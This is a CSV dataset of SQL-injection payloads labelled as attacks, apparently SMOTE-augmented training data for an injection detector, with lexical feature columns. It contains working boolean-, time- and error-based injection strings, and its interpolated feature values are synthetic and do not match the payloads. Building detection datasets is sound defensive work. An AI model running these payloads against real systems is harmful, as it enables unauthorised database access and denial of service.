id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,0.35678428860251193,196.29542397092266,34.221073453664324,3.7723924959380164,57.984491624468355,24.552683634160807,78.65288144397186,35.105367268321615,0.2943836621770676,0.1255185606713196,0.4010155072335421,0.17908226991807064,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.66322036099297,1.7789265463356774,1.1105367268321613,3.1105367268321613,8.442146907328645,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.221073453664323,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.221073453664323
SMOTE_000012,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000022,0.3563210531416818,112.58203020044004,32.66633037430711,3.711548796015903,33.16607815503744,15.666330374307108,46.58303907751872,17.166582593576777,0.2938519426589321,0.13859225584572413,0.41465898834989146,0.15289681314545228,3.0,0.0,2.0,1.0,0.0,1.0832912967883883,0.0,9.0,0.0,0.0,1.0,4.166582593576777,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.08329129678838842,0.0,0.08329129678838848,0.0,0.9167087032116116,0.08329129678838854,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.166582593576777
SMOTE_000013,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,0.9953824278054103,158.32543800721348,36.837280996393254,4.202518691329573,76.32543800721349,16.325438007213485,47.69824797114605,17.976314021640462,0.48206827201706903,0.1030938369076074,0.30135983849238984,0.1134780525829337,0.48815701082023066,0.8372809963932564,2.0,0.0,1.0,2.0,0.0,5.837280996393256,0.0,0.8135950180337177,2.3254380072134873,5.162719003606743,0.16271900360674368,0.8372809963932564,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.1627190036067436,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.162719003606743
SMOTE_000014,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,0.2984587663986517,155.79796895599526,36.392543160274556,4.1728776336422655,75.16474684537751,15.392543160274553,48.392543160274556,16.84813579006864,0.4827487175406735,0.09828546344948755,0.31071147779803804,0.10825434121180089,0.0,0.9240678950343191,2.0,0.0,1.0,1.924067895034319,0.0,6.0,0.0,0.0,2.0,4.9240678950343195,0.0,0.9240678950343191,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.9240678950343191,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.924067895034319
SMOTE_000015,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000014,0.8829276866945759,161.05551487797126,33.873843440042265,3.898078819496234,62.11690408029585,12.144661519281488,60.40622711885883,26.38772215953508,0.3899768852735951,0.07315644006702425,0.3735515924162961,0.16331508224308455,3.1261565599577343,0.0,0.0,0.0,0.0,0.2523131199154691,0.0,12.756939359746408,0.2523131199154691,1.8738434400422654,1.2523131199154691,6.252313119915469,1.0,0.0,0.0,0.0,0.0,0.12615655995773456,1.0,0.0,0.0,0.0,1.0,0.8738434400422654,0.0,0.0,0.8738434400422654,1.1261565599577346,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6307827997886728,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5046262398309382
SMOTE_000016,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000022,0.0811102681422792,110.27931105356042,31.955898254700983,3.687663437692412,32.48511919828916,14.897095927635633,45.92649709116831,16.970598836467325,0.2940398279138742,0.13527067556282685,0.4167065800961757,0.1539829164271232,2.9558982547009847,0.0,2.0,0.9852994182336616,0.014700581766338428,1.0,0.0,8.955898254700985,0.0,0.0,1.0147005817663381,4.0,0.9852994182336616,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.014700581766338372,0.0,0.0,0.014700581766338261,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0294011635326772
SMOTE_000017,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,1.6844437696390295,255.0,36.34419380482605,3.800946786569871,79.93483717104371,31.753550438608382,100.0,43.311612390347904,0.3134699496903675,0.12452372721022895,0.39215686274509803,0.1698494603543055,2.623224780695808,0.0,0.688387609652096,0.0,0.0,2.0,0.0,22.0,0.0,2.0,4.0,12.688387609652096,0.655806195173952,0.0,0.3441938048260479,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.34419380482604794,0.0,0.6558061951739521,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000018,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,1.4778074947128168,224.7822113648393,35.08430943529816,3.784051036997045,69.63817737652516,26.710773588245402,89.01171322357793,39.421547176490805,0.30757534804641756,0.11979589449989081,0.3967167908606378,0.17591196659305375,4.0,0.0,0.0,0.0,0.0,2.0,0.0,19.25292830589448,0.9156905647018395,1.5421547176490802,3.54215471764908,10.16861887059632,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.08430943529816,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.08430943529816
SMOTE_000019,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,1.5399773647463426,63.00121429241669,23.77804762053704,3.744228564225112,14.0,20.111583335939823,20.667071430805564,8.2225595256713,0.2266458281210875,0.3178372205493416,0.32793700409235504,0.1275799472372158,0.0,1.0,2.4445119051342603,0.0,0.0,2.0,0.0,1.8890238102685206,0.0,0.4445119051342604,0.44451190513426053,4.44451190513426,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5554880948657397,0.4445119051342604,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000020,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,2.0093335807686294,122.22562603366194,31.073076220327902,4.096352588462925,55.096143304918556,16.0,36.36538110163952,14.764101627103871,0.4308490567872662,0.1412414214031608,0.30251295134097794,0.12539657046859504,0.0,1.9269237796720962,1.6910254067759678,0.0,0.691025406775968,1.691025406775968,0.0,4.691025406775967,0.0,0.3089745932240321,1.6910254067759678,4.073076220327904,0.0,1.0,0.6910254067759679,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6910254067759678,0.0,0.6910254067759678,0.691025406775968,0.3089745932240322,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.382050813551936
SMOTE_000021,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.8327234854813816,251.0358137979681,36.66069770033865,3.7789480313478534,76.7144183972908,29.0,100.0,45.321395400677304,0.30546090180133506,0.1155360485055347,0.39840016726046446,0.18060288243266578,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,1.3213954006772997,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000022,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000003,1.9716185732864413,47.78113358459548,16.12996274707055,2.858263521311883,3.7824906867676376,11.738717403686731,23.12996274707055,9.12996274707055,0.07911079588278355,0.24354263119412556,0.4942840069744242,0.1830625659486667,2.1737360301514563,0.0,0.3912453433838189,0.0,0.391245343383819,1.3912453433838188,0.0,3.3912453433838188,1.391245343383819,0.0,-2.220446049250313e-16,2.1737360301514563,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.391245343383819,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3912453433838188
SMOTE_000023,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,2.2547580351719274,154.04364820887446,34.23055374621212,4.091555396238277,75.60436482088744,12.834918567099564,47.41745928354978,18.186905537337665,0.49119792926042416,0.08258718620679693,0.3077240764867438,0.11849080804603512,0.0,2.1869055373376636,1.2087296417748907,0.0,1.0,2.0,0.0,6.0,0.7912703582251094,0.0,2.0,4.208729641774891,0.0,1.0,0.6043648208874455,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6043648208874454,1.0,1.3956351791125545,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000024,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,1.230796529943137,126.29951285790392,36.97342911780375,3.962834520278805,39.08212369783713,23.21618363444259,46.73067460116491,17.270530924459283,0.297173015635039,0.19893064186579376,0.36570008134609383,0.13819626115307343,2.3514490966722317,0.21618363444258945,2.216183634442589,0.7838163655574105,0.0,2.0,0.0,7.702898193344463,0.0,0.21618363444258948,1.0,5.783816365557411,0.7838163655574106,0.21618363444258948,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7838163655574105,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.783816365557411
SMOTE_000025,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000027,0.7802595201852272,254.69114522784582,32.931331778742525,3.8298144807575922,55.030023318862085,74.67390206077923,95.94857494580911,29.038644902395387,0.22459096799006734,0.28749091653684783,0.3739452869909285,0.11397282848215637,0.0,0.06866822125747252,2.0,0.0,1.9313317787425275,2.0,0.0,17.107313123652858,0.0,0.0,5.72532711497011,5.9313317787425275,0.0,0.06866822125747252,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9313317787425274,0.0,3.793995336227582,0.0,1.0,1.0,0.9313317787425275,0.06866822125747257,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9313317787425274,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.72532711497011
SMOTE_000026,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,2.3441559205475766,91.20594848093342,27.26798855131854,3.5074194060560755,20.147638999019804,15.477667620723455,38.4466475855309,17.13399427565927,0.1896990251707476,0.18827810126314515,0.42658692720422065,0.19543594636188658,5.04466475855309,0.0,0.47766762072345514,0.5223323792765449,0.47766762072345514,2.0,0.0,6.08932951710618,2.0,0.0,0.5223323792765449,3.477667620723455,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
